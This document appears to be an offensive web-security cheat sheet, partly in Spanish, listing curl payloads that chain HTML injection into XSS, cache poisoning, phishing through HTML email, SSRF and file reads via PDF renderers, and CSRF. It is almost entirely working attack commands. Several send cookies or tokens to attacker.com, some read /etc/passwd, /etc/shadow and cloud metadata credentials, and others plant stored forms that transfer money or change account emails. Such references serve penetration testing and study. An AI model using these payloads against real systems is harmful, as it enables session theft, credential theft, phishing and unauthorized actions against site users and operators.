---
aliases:
  - HTML Injection Chains
  - HTML to XSS
  - HTML Email Injection
  - PDF Template Injection
tags:
  - type/technique
  - vuln/html-injection
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Technique
linked:
  - '[[HTML Injection]]'
  - '[[Cross-Site Scripting (XSS)]]'
  - '[[Web Cache Poisoning]]'
  - '[[Server-Side Template Injection (SSTI)]]'
---
# HTML Injection - Chains con Otras Vulns

***

## HTML to XSS Upgrade

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl 'https://target/?q=<img src=x onerror=alert(document.domain)>'` | Image onerror event XSS | Filter allows `<img>`. |
| `curl 'https://target/?q=<img src=//attacker.com/log onload=fetch("//attacker.com/?c="+document.cookie)>'` | Image onload triggers on success | Image triggered. |
| `curl 'https://target/?q=<svg onload=alert(1)>'` | SVG onload XSS | SVG whitelisted. |
| `curl 'https://target/?q=<svg><script>alert(1)</script></svg>'` | SVG embedded script | SVG context bypass. |
| `curl 'https://target/?q=<body onload=alert(1)>'` | Body onload | Body context. |
| `curl 'https://target/?q=<iframe srcdoc="<script>alert(1)</script>"></iframe>'` | Iframe srcdoc different parsing context | Filter context. |
| `curl 'https://target/?q=<object data="javascript:alert(1)"></object>'` | Object javascript: scheme | Legacy. |
| `curl 'https://target/?q=<form><button formaction="javascript:alert(1)">x</button></form>'` | Button formaction javascript: | HTML5 formaction. |
| `curl 'https://target/?q=<details ontoggle=alert(1) open>x</details>'` | Details ontoggle | HTML5 event. |
| `curl 'https://target/?q=<input onfocus=alert(1) autofocus>'` | Auto-focus event | Auto-trigger. |
| `curl 'https://target/?q=<select onfocus=alert(1) autofocus>'` | Same con select | Auto-trigger. |
| `curl 'https://target/?q=<video><source onerror=alert(1)></video>'` | Video source onerror | HTML5 video. |
| `curl 'https://target/?q=<math><mtext><a href="javascript:alert(1)">x</a></mtext></math>'` | MathML XSS edge | MathML rare. |
| `curl 'https://target/?q=<svg><animate attributeName=href values=javascript:alert(1)></svg>'` | SVG animate href to javascript: | SVG SMIL. |
| `curl 'https://target/?q=<style>@import url("https://attacker.com/x.css")</style>'` (sin script-src CSP) | CSS @import chain | CSP gap. |
^htmli-chain-xss

___

## Cache Poisoning Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -H "X-Forwarded-Host: attacker.com<script>alert(1)</script>" https://target/ \| grep "attacker.com<script>"` | XFH reflection HTML inject cache poison | Unkeyed header reflected. |
| `curl -H "X-Forwarded-Host: attacker.com'><img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>" https://target/?cb=1` | XFH break attribute + XSS | Attribute context. |
| `curl -H "X-Forwarded-Scheme: javascript" -H "X-Forwarded-Host: alert(1)" https://target/?cb=2` | Scheme + host chain | Compound. |
| `curl -X POST -d "search=<form action=//attacker.com><input name=p type=password><button>Re-login</button></form>" https://target/?cb=3 \| grep form` | Stored cache poison via search reflected | Cache + reflected. |
| `python3 param-miner.py -u https://target/ -w params.txt` then poison discovered unkeyed param | Discover unkeyed input + poison | Standard workflow. |
| `curl -H "X-Forwarded-Host: attacker.com<script>fetch(\`//attacker.com/?c=\${document.cookie}\`)</script>" https://target/?cb=4` | XFH script inject | Cookie steal cache. |
| `for i in {1..100}; do curl -H "X-Forwarded-Host: x.com'><base href='//attacker.com/'>" "https://target/?cb=$i"; done` | Base href hijack cache poison loop | Asset hijack cache. |
| `wcvs -u https://target/ -w params.txt` (Web Cache Vulnerability Scanner) | Auto WCVS scanner | Automated. |
| `curl -H "Cache-Control: max-age=86400" -H "X-Forwarded-Host: ..." https://target/?cb=5` | Force long cache TTL post-poison | TTL extend. |
| `for ts in {0..3600}; do sleep 1; curl -H "X-Forwarded-Host: attacker.com'><img src=x>" "https://target/news?cb=$(date +%s)"; done` | Sustained re-poison high-traffic moments | Maximum reach. |
| `curl -H "X-Forwarded-Host: attacker.com" -H "Transfer-Encoding: chunked" --data-binary @smuggle.txt https://target/` (CL.TE smuggle + cache) | Smuggle response cache poison HTML inject | HRS combo. |
^htmli-chain-cache

___

## HTML Email Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d "name=<a href='//attacker.com'>Click here</a>&email=victim@target.com" https://target/register` | Welcome email phishing link inject | Welcome flow. |
| `curl -X POST -d "email=victim@target.com" https://target/forgot` luego inspect email para HTML render | Reset email phishing link | Reset flow. |
| `curl -X POST -d "signature=<a href='//attacker.com/scam'>Verified Seller</a>" https://target/profile` (signature en emails) | Stored signature en sent emails | Stored email. |
| `curl -X POST -d "name=<img src='//attacker.com/track?u=victim'>" https://target/contact` | Tracking pixel via name field | Email tracking. |
| `curl -X POST -d "subject=Update <!-- <script>alert(1)</script> -->&body=text" https://target/send` | HTML subject (some clients render) | Edge client. |
| `curl -X POST -d 'comment=<!--[if mso]>This shows in Outlook only<![endif]-->' https://target/comments` | Outlook conditional comment targeting | Per-client target. |
| `curl -X POST -d 'body=<a href="mailto:victim@target.com?subject=Reset&body=Code:%20$CODE">Click</a>' https://target/template` | mailto with pre-filled phishing | Phish-email. |
| `curl -X POST -d 'body=<a href="tel:+1-555-PHISH">Call Support</a>' https://target/template` | tel: vishing email | Vishing combo. |
| `curl -X POST -d 'body=<meta http-equiv="refresh" content="0;url=https://attacker.com">' https://target/newsletter` | Auto-refresh email | Some clients. |
| `curl -X POST -d "name=<base href='//attacker.com/'>" https://target/register` (base href in email) | Email base href hijack assets | Asset hijack. |
| `python3 swaks --to victim@target.com --from "attacker@attacker.com" --header "Subject: Update" --body @malicious.html` | Direct swaks test email send | Manual test. |
^htmli-chain-email

___

## PDF / Print Template Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'invoice_note=<iframe src="file:///etc/passwd" width="100%" height="500"></iframe>' https://target/invoice/generate` | wkhtmltopdf file:// read /etc/passwd | wkhtmltopdf backend. |
| `curl -X POST -d 'report_data=<img src="file:///etc/shadow">' https://target/report/pdf` | Image-based file read | File read via img. |
| `curl -X POST -d 'note=<link rel="stylesheet" href="file:///etc/passwd">' https://target/pdf` | CSS file read | CSS load file. |
| `curl -X POST -d 'note=<iframe src="http://169.254.169.254/latest/meta-data/" width=600 height=400></iframe>' https://target/pdf` | SSRF AWS metadata via PDF render | AWS SSRF. |
| `curl -X POST -d 'note=<iframe src="http://localhost:8080/admin" width=800 height=600></iframe>' https://target/pdf` | Internal SSRF | Internal network. |
| `curl -X POST -d 'note=<iframe src="http://169.254.170.2/v2/credentials/$(curl http://169.254.170.2/v2/credentials/ -s)" ></iframe>' https://target/pdf` | ECS task credentials SSRF | ECS-context. |
| `curl -X POST -d 'note=<script>fetch("http://internal/admin").then(r=>r.text()).then(t=>document.body.innerText=t)</script>' https://target/pdf` (Chromium-headless) | JS execution in Chromium PDF | Headless Chromium. |
| `curl -X POST -d 'note=<link rel="stylesheet" href="https://attacker.com/style.css">' https://target/pdf` | External CSS load server-side | External resource. |
| `curl -X POST -d 'note=<style>@media print { body::after { content: url("http://internal/secret"); } }</style>' https://target/pdf` | Print media query SSRF | Print-only. |
| `nuclei -t exposures/configs/wkhtmltopdf-version.yaml -u https://target` | Identify wkhtmltopdf version pre-attack | Pre-attack version. |
| `curl -X POST -d 'note=<object data="file:///etc/passwd"></object>' https://target/pdf` | Object tag file read | Object embed. |
| `curl -X POST -d 'note=<embed src="file:///etc/passwd">' https://target/pdf` | Embed tag file read | Same. |
^htmli-chain-pdf

### PoC PDF SSRF + file read

```html
<iframe src="file:///etc/passwd" width="100%" height="500"></iframe>
<img src="file:///etc/shadow">
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100%" height="500"></iframe>
```

Send to PDF generator endpoint. Engine loads `file://` and `http://` internal URLs. Resultados aparecen en PDF generado.

___

## CSRF + HTML Injection Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -d 'comment=<form id="x" action="https://target.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.getElementById("x").submit()</script>' https://target/comments` | Stored auto-submit form CSRF | XSS+CSRF chain. |
| `curl -X POST -d 'comment=<img src="https://target.com/api/delete?id=42">' https://target/comments` | GET-based CSRF via image | GET endpoint vuln. |
| `curl -X POST -d 'comment=<iframe src="https://target.com/admin/grant?user=attacker&role=admin" style="display:none"></iframe>' https://target/comments` | Iframe GET CSRF | GET admin action. |
| `curl -X POST -d 'comment=<form action="https://target.com/critical-action" method="POST"><input name="x" value="y"><button>Click for Prize</button></form>' https://target/comments` | User-triggered form CSRF | User-click required. |
| `curl -X POST -d 'profile=<form id="x" action="https://target.com/email/change" method="POST"><input name="email" value="attacker@evil.com"></form>' https://target/profile` (con XSS submit) | Stored profile-view CSRF email change | Stored on profile. |
| `curl -X POST -d 'comment=<img src="https://target.com/api/csrf-token-display"><script>fetch("//attacker.com/?t="+document.body.innerText)</script>' https://target/comments` | CSRF token leak + reuse | Token leak chain. |
| `curl -X POST -d 'comment=<form action="https://target.com/api/x" method="POST"><input name="_method" value="DELETE"><button>x</button></form>' https://target/comments` | Method-override DELETE CSRF | _method override. |
| `curl -X POST -d 'comment=<iframe srcdoc="<form action=https://target.com/api/x method=POST id=f><input name=admin value=true></form><script>document.getElementById(\"f\").submit()</script>"></iframe>' https://target/comments` | srcdoc auto-CSRF | iframe context. |
| `curl -X POST -d 'comment=<a href="https://target.com/transfer?to=attacker&amount=10000">Click to claim prize</a>' https://target/comments` | GET CSRF link disguise | Link disguise. |
| `curl -X POST -d 'sig=<img src="https://target.com/api/refresh?action=extend">' https://target/profile` (stored signature) | Stored CSRF session-extension | Persistent CSRF. |
^htmli-chain-csrf

***
